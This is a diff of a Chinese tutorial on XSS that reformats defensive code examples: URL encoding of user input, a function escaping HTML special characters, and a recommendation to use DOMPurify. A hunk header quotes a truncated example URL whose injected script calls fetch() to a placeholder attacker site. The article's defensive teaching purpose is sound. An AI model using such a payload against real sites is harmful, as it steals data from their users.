@@ -36,19 +36,19 @@ http://www.xxx.com/music?name='青花瓷'<script>fetch(`http://恶意者的网�
 一种方式是对用户输入进行 encode，比如：
 
 ```js
-${encodeURIComponent(req.query.name)
+encodeURIComponent(req.query.name);
 ```
 
 第二种方式就是替换掉特殊字符，比如 `<` `&` 等，只要替换掉，自然就不会解析了
 
 ```js
 function replaceSpecialSymbol(str) {
-	return str
-					.replace(/&/g, '&amp;')
-          .replace(/"/g, '&quot;')
-          .replace(/'/g, '&apos;')
-          .replace(/</g, '&lt;')
-          .replace(/>/g, '&gt;');
+  return str
+    .replace(/&/g, '&amp;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&apos;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
 }
 ```
 
@@ -103,4 +103,3 @@ DOM 型 XSS 与反射型或存储型 XSS 的区别在于，DOM 型在服务器�
 ## 5. 防御方案
 
 这里推荐使用 [DOMPurify](https://github.com/cure53/DOMPurify) 库对用户的输入进行过滤，然后再使用 innerHTML 插入到 DOM 中。
-
